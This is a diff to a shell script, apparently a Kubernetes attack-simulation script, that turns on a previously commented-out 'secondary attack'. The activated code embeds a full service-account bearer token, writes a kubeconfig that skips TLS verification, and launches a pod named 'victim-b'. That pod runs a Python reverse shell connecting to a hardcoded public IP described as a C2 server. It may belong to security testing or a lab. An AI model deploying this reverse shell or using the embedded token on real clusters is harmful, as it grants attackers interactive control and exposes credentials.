@@ -9,58 +9,58 @@ if command -v kubectl; then
 echo "   └- Yes it has \"kubectl\" tool \"$(command -v kubectl)\"" >&3
 fi
 
-# echo "   └- Lets setup secondary attack with Legacy SA token to use with \"kubectl\"" >&3
-# K8S_API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
-# K8S_CLUSTER="local-current"
-# SA_TOKEN=""
-# 
-# export KUBECONFIG="/tmp/sa-config.yaml"
-# cat <<EOF > /tmp/sa-config.yaml
-# apiVersion: v1
-# kind: Config
-# clusters:
-# - name: ${K8S_CLUSTER}
-#   cluster:
-#     server: ${K8S_API_SERVER}
-#     insecure-skip-tls-verify: true
-# users:
-# - name: sa-user
-#   user:
-#     token: ${SA_TOKEN}
-# contexts:
-# - name: sa-context
-#   context:
-#     cluster: ${K8S_CLUSTER}
-#     user: sa-user
-# current-context: sa-context
-# EOF
-# 
-# echo "      └- Already Launch in default/victim-b connecting to C2 Server" >&3
-# if kubectl -n default get pod victim-b 2>&1 >/dev/null; then
-#   exit 0
-# fi
-# 
-# echo "      └- Starting Launch to default/victim-b connecting to C2 Server" >&3
-# kubectl apply -f - <<'EOF'
-# ---
-# apiVersion: v1
-# kind: Pod
-# metadata:
-#   namespace: default
-#   name: victim-b
-# spec:
-#   containers:
-#     - name: reverse-shell
-#       image: python:3.12.12-alpine3.23
-#       stdin: true
-#       tty: true
-#       env:
-#         - name: C2_SERVER_IP
-#           value: "13.112.164.157"
-#       command:
-#         - /bin/sh
-#       args:
-#         - -c
-#         - |
-#           python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',8001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
-# EOF
+echo "   └- Lets setup secondary attack with Legacy SA token to use with \"kubectl\"" >&3
+K8S_API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+K8S_CLUSTER="local-current"
+SA_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjBMVnphYkswTEVDOGFvNU0zcXlSX2ZCX01UZmVCNGNwSGQ5NGlvZ1FFMWcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC1sZWdhY3ktc2EtdG9rZW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoia3ViZXJuZXRlcy1kYXNoYm9hcmQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyMTA5YWI2Ni05YzQwLTRmYjItOTViZi0xMGVhZTUyZDQwZjQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQifQ.I-pcRhf1xW2d1ZWmcwAlES28PsYuHJ00eD7lfGkKJNYIt5OJW5NCPK8bWKOFJZV-EIHnEP2bP1oirEYX-hOvW97g9M4HLA26n5UJJc5bVbrw-YfnOsrjwD7TZnHww1ZNdHUPMKkYtN1z3HWfYc3ckzoSsUfCxfjrwwG74Fj196oNrgi8rD20jdjVbUX3Fv0OlEcS8QqSoLnO_JhycOPKO61duYGiyMjBRzz36Du3iQf9omqKKy7cgN-YftlqpM2PfJ4efe_aTCm6__xaF1zPXzNX9aMwKb7scZK9d9rmGpEQwGq_fTCOkU96vT2kdVbQtZj3HwxlCNdW6KO0bvCVIw"
+
+export KUBECONFIG="/tmp/sa-config.yaml"
+cat <<EOF > /tmp/sa-config.yaml
+apiVersion: v1
+kind: Config
+clusters:
+- name: ${K8S_CLUSTER}
+  cluster:
+    server: ${K8S_API_SERVER}
+    insecure-skip-tls-verify: true
+users:
+- name: sa-user
+  user:
+    token: ${SA_TOKEN}
+contexts:
+- name: sa-context
+  context:
+    cluster: ${K8S_CLUSTER}
+    user: sa-user
+current-context: sa-context
+EOF
+
+echo "      └- Already Launch in default/victim-b connecting to C2 Server" >&3
+if kubectl -n default get pod victim-b 2>&1 >/dev/null; then
+  exit 0
+fi
+
+echo "      └- Starting Launch to default/victim-b connecting to C2 Server" >&3
+kubectl apply -f - <<'EOF'
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  namespace: default
+  name: victim-b
+spec:
+  containers:
+    - name: reverse-shell
+      image: python:3.12.12-alpine3.23
+      stdin: true
+      tty: true
+      env:
+        - name: C2_SERVER_IP
+          value: "13.112.164.157"
+      command:
+        - /bin/sh
+      args:
+        - -c
+        - |
+          python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',8001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+EOF
